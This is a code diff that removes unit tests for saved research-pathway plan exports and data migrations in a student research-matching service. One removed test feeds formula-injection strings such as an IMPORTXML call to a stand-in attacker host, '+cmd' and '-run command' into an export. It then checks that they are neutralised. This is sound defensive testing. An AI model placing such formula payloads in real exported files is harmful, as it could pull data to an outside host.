@@ -7,58 +7,13 @@ import {
   MAX_SAVED_RESEARCH_ENTITY_SHORT_DESCRIPTION_LENGTH,
   boundSavedResearchEntitySummaryText,
   buildCaseInsensitiveNetidFilter,
-  buildSavedPathwayPlanUnsetForIds,
-  buildSavedPathwayPlansExport,
-  buildSavedResearchEntityMigration,
   normalizeObjectIdStringForUserMutation,
   normalizeObjectIdsForUserMutation,
   normalizeUserLookupObjectId,
-  pruneSavedPathwayPlansForExistingPathways,
   sanitizeSavedPathwayPlanForStorage,
   sanitizeSavedProgramTrackingForResponse,
-  savedResearchEntityLegacyMigrationClaimFilter,
-  savedResearchEntityLegacyMigrationInputs,
   type SavedPathwayPlanInput,
 } from '../userService';
-import type { PathwaySearchHit } from '../pathwaySearchService';
-
-const pathway = (overrides: Partial<PathwaySearchHit> = {}): PathwaySearchHit => ({
-  _id: '665f0b0c0b0c0b0c0b0c0b0c',
-  pathwayType: 'EXPLORATORY_CONTACT',
-  status: 'PLAUSIBLE',
-  evidenceStrength: 'INDIRECT',
-  studentFacingLabel: 'Explore archival climate records',
-  bestNextStepCategory: 'plan-outreach',
-  sourceUrls: ['https://example.edu/pathway', 'mailto:private@example.edu'],
-  researchEntity: {
-    _id: '665f0b0c0b0c0b0c0b0c0b0d',
-    slug: 'climate-archive',
-    name: 'Climate Archive',
-    departments: ['History'],
-    researchAreas: ['Environmental history'],
-  },
-  activePostedOpportunity: {
-    _id: '665f0b0c0b0c0b0c0b0c0b0e',
-    title: 'Archive assistant',
-    applicationUrl: 'https://example.edu/apply',
-    status: 'OPEN',
-  },
-  evidence: [
-    {
-      signalType: 'posted_opening',
-      confidence: 'HIGH',
-      sourceUrl: 'https://example.edu/evidence',
-    },
-  ],
-  contactRoute: {
-    routeType: 'FACULTY_PI',
-    label: 'Private contact route',
-    url: 'mailto:private@example.edu',
-    visibility: 'PRIVATE',
-  },
-  ...overrides,
-});
-
 describe('buildCaseInsensitiveNetidFilter', () => {
   it('rejects malformed netids before building regex filters', () => {
     expect(() => buildCaseInsensitiveNetidFilter('.*+$[x]')).toThrow(/Invalid netid/);
@@ -133,31 +88,6 @@ describe('sanitizeSavedProgramTrackingForResponse', () => {
       stage: 'not_applied',
       revision: 0,
       updatedAt: new Date(0).toISOString(),
-    });
-  });
-});
-
-describe('pruneSavedPathwayPlansForExistingPathways', () => {
-  it('keeps plans only for pathways that still resolve', () => {
-    const result = pruneSavedPathwayPlansForExistingPathways(
-      {
-        '665f0b0c0b0c0b0c0b0c0b0c': {
-          intent: 'outreach',
-          stage: 'ready',
-        },
-        '665f0b0c0b0c0b0c0b0c0b0d': {
-          intent: 'thesis',
-          stage: 'researching',
-        },
-      },
-      ['665f0b0c0b0c0b0c0b0c0b0c'],
-    );
-
-    expect(result).toEqual({
-      '665f0b0c0b0c0b0c0b0c0b0c': {
-        intent: 'outreach',
-        stage: 'ready',
-      },
     });
   });
 });
@@ -292,17 +222,6 @@ describe('sanitizeSavedPathwayPlanForStorage', () => {
   });
 });
 
-describe('buildSavedPathwayPlanUnsetForIds', () => {
-  it('builds update paths used when saved pathways or plans are deleted', () => {
-    expect(
-      buildSavedPathwayPlanUnsetForIds(['665f0b0c0b0c0b0c0b0c0b0c', '665f0b0c0b0c0b0c0b0c0b0d']),
-    ).toEqual({
-      'savedPathwayPlans.665f0b0c0b0c0b0c0b0c0b0c': '',
-      'savedPathwayPlans.665f0b0c0b0c0b0c0b0c0b0d': '',
-    });
-  });
-});
-
 describe('normalizeObjectIdsForUserMutation', () => {
   it('normalizes ObjectId instances without falling back to arbitrary object coercion', () => {
     const objectId = new mongoose.Types.ObjectId('665f0b0c0b0c0b0c0b0c0b0c');
@@ -359,240 +278,6 @@ describe('normalizeObjectIdsForUserMutation', () => {
     } catch (error: any) {
       expect(error.status).toBe(400);
     }
-  });
-});
-
-describe('buildSavedPathwayPlansExport', () => {
-  it('exports saved pathway planning fields without contact routes or private notes by default', () => {
-    const savedPlans: Record<string, SavedPathwayPlanInput> = {
-      '665f0b0c0b0c0b0c0b0c0b0c': {
-        intent: 'outreach',
-        stage: 'ready',
-        note: 'Ask whether undergraduates can help with digitization.',
-        checklist: {
-          'outreach-route': true,
-          'outreach-followup': false,
-          'ignored-null': null,
-        },
-      },
-    };
-
-    const result = buildSavedPathwayPlansExport([pathway()], savedPlans, {
-      exportedAt: new Date('2026-05-13T12:00:00.000Z'),
-    });
-
-    expect(result).toMatchObject({
-      schemaVersion: 1,
-      exportedAt: '2026-05-13T12:00:00.000Z',
-      itemCount: 1,
-      privacy: {
-        includesPrivateNotes: false,
-        includesContactRoutes: false,
-        includesNonPublicContactEmails: false,
-      },
-      items: [
-        {
-          pathwayId: '665f0b0c0b0c0b0c0b0c0b0c',
-          title: 'Explore archival climate records',
-          intent: 'outreach',
-          stage: 'ready',
-          checklist: {
-            'outreach-route': true,
-            'outreach-followup': false,
-            'ignored-null': false,
-          },
-          sourceLinks: [
-            'https://example.edu/pathway',
-            'https://example.edu/evidence',
-            'https://example.edu/apply',
-          ],
-          bestNextStepCategory: 'plan-outreach',
-        },
-      ],
-    });
-    expect(result.items[0]).not.toHaveProperty('privateNote');
-    expect(JSON.stringify(result)).not.toContain('private@example.edu');
-    expect(JSON.stringify(result)).not.toContain('contactRoute');
-  });
-
-  it('includes private notes only when the caller explicitly requests them', () => {
-    const result = buildSavedPathwayPlansExport(
-      [pathway()],
-      {
-        '665f0b0c0b0c0b0c0b0c0b0c': {
-          note: 'Bring this to advising.',
-        },
-      },
-      {
-        includePrivateNotes: true,
-      },
-    );
-
-    expect(result.privacy.includesPrivateNotes).toBe(true);
-    expect(result.items[0].privateNote).toBe('Bring this to advising.');
-  });
-
-  it('neutralizes formula-like strings in saved plan exports', () => {
-    const result = buildSavedPathwayPlansExport(
-      [
-        pathway({
-          studentFacingLabel: '=IMPORTXML("https://attacker.invalid","//a")',
-          researchEntity: {
-            _id: '665f0b0c0b0c0b0c0b0c0b0d',
-            slug: 'climate-archive',
-            name: '+cmd',
-            displayName: '@hidden',
-            departments: ['History'],
-            researchAreas: ['Environmental history'],
-          },
-        }),
-      ],
-      {
-        '665f0b0c0b0c0b0c0b0c0b0c': {
-          note: '-run command',
-          checklist: {
-            '=callout': true,
-          },
-        },
-      },
-      {
-        includePrivateNotes: true,
-      },
-    );
-
-    expect(result.items[0].title).toBe('\'=IMPORTXML("https://attacker.invalid","//a")');
-    expect(result.items[0].researchEntity.name).toBe("'@hidden");
-    expect(result.items[0].privateNote).toBe("'-run command");
-    expect(result.items[0].checklist).toEqual({ "'=callout": true });
-  });
-
-  it('redacts direct contact details from exported system-derived labels', () => {
-    const result = buildSavedPathwayPlansExport(
-      [
-        pathway({
-          studentFacingLabel: 'Email lab-manager@yale.edu or call 203-555-1212',
-          researchEntity: {
-            _id: '665f0b0c0b0c0b0c0b0c0b0d',
-            slug: 'climate-archive',
-            name: 'Climate Archive contact archive@example.edu',
-            displayName: 'Climate Archive 203-555-0000',
-            departments: ['History'],
-            researchAreas: ['Environmental history'],
-          },
-        }),
-      ],
-      {},
-    );
-
-    expect(result.items[0].title).toBe('Email [email redacted] or call [phone redacted]');
-    expect(result.items[0].researchEntity.name).toBe('Climate Archive [phone redacted]');
-    expect(result.privacy.includesNonPublicContactEmails).toBe(false);
-    expect(JSON.stringify(result)).not.toContain('lab-manager@yale.edu');
-    expect(JSON.stringify(result)).not.toContain('archive@example.edu');
-    expect(JSON.stringify(result)).not.toContain('203-555');
-  });
-
-  it('defaults missing plans to a student-facing intent from the pathway action', () => {
-    const result = buildSavedPathwayPlansExport(
-      [pathway({ bestNextStepCategory: 'find-funding' })],
-      {},
-    );
-
-    expect(result.items[0]).toMatchObject({
-      intent: 'funding',
-      stage: 'saved',
-      checklist: {},
-    });
-  });
-});
-
-describe('buildSavedResearchEntityMigration', () => {
-  it('deduplicates pathways by entity and preserves every colliding private plan', () => {
-    const firstId = '665f0b0c0b0c0b0c0b0c0b0c';
-    const secondId = '665f0b0c0b0c0b0c0b0c0b0f';
-    const entityId = '665f0b0c0b0c0b0c0b0c0b0d';
-    const first = sanitizeSavedPathwayPlanForStorage({ note: 'First private note' });
-    const second = sanitizeSavedPathwayPlanForStorage({ note: 'Second private note' });
-
-    const result = buildSavedResearchEntityMigration(
-      [pathway({ _id: secondId }), pathway({ _id: firstId })],
-      { [firstId]: first, [secondId]: second },
-    );
-
-    expect(result.entityIds).toEqual([entityId]);
-    expect(result.plans[entityId]).toBeUndefined();
-    expect(result.conflicts[entityId]).toEqual({
-      [firstId]: first,
-      [secondId]: second,
-    });
-  });
-
-  it('never overwrites an existing entity-owned plan during lazy migration', () => {
-    const entityId = '665f0b0c0b0c0b0c0b0c0b0d';
-    const existing = sanitizeSavedPathwayPlanForStorage({ note: 'Canonical entity note' });
-    const result = buildSavedResearchEntityMigration(
-      [pathway()],
-      { [pathway()._id]: sanitizeSavedPathwayPlanForStorage({ note: 'Legacy note' }) },
-      [entityId],
-      { [entityId]: existing },
-    );
-
-    expect(result.plans[entityId]).toEqual(existing);
-  });
-});
-
-describe('savedResearchEntityLegacyMigrationInputs', () => {
-  it('never re-imports legacy pathway state after migration completes', () => {
-    const pathwayId = '665f0b0c0b0c0b0c0b0c0b0c';
-    expect(
-      savedResearchEntityLegacyMigrationInputs({
-        savedResearchEntityMigrationCompleted: true,
-        favPathways: [pathwayId],
-        savedPathwayPlans: {
-          [pathwayId]: { note: 'Legacy note that must not resurrect' },
-        },
-      }),
-    ).toEqual({ migrationCompleted: true, pathwayIds: [], legacyPlans: {} });
-  });
-
-  it('returns bounded legacy inputs before the one-time migration', () => {
-    const pathwayId = '665f0b0c0b0c0b0c0b0c0b0c';
-    const result = savedResearchEntityLegacyMigrationInputs({
-      savedResearchEntityMigrationCompleted: false,
-      favPathways: [pathwayId],
-      savedPathwayPlans: { [pathwayId]: { intent: 'outreach', note: 'Legacy note' } },
-    });
-
-    expect(result.migrationCompleted).toBe(false);
-    expect(result.pathwayIds).toEqual([pathwayId]);
-    expect(result.legacyPlans[pathwayId]).toMatchObject({
-      intent: 'outreach',
-      note: 'Legacy note',
-    });
-  });
-});
-
-describe('savedResearchEntityLegacyMigrationClaimFilter', () => {
-  it('claims only the legacy snapshot used to build the migration', () => {
-    const pathwayId = new mongoose.Types.ObjectId('665f0b0c0b0c0b0c0b0c0b0c');
-    const savedPathwayPlans = {
-      [pathwayId.toHexString()]: { intent: 'outreach', note: 'Legacy note' },
-    };
-
-    expect(
-      savedResearchEntityLegacyMigrationClaimFilter({
-        favPathways: [pathwayId],
-        savedPathwayPlans,
-      }),
-    ).toEqual({
-      savedResearchEntityMigrationCompleted: { $ne: true },
-      $expr: {
-        $and: [
-          { $eq: [{ $ifNull: ['$favPathways', []] }, [pathwayId]] },
-          { $eq: [{ $ifNull: ['$savedPathwayPlans', {}] }, savedPathwayPlans] },
-        ],
-      },
-    });
   });
 });
 
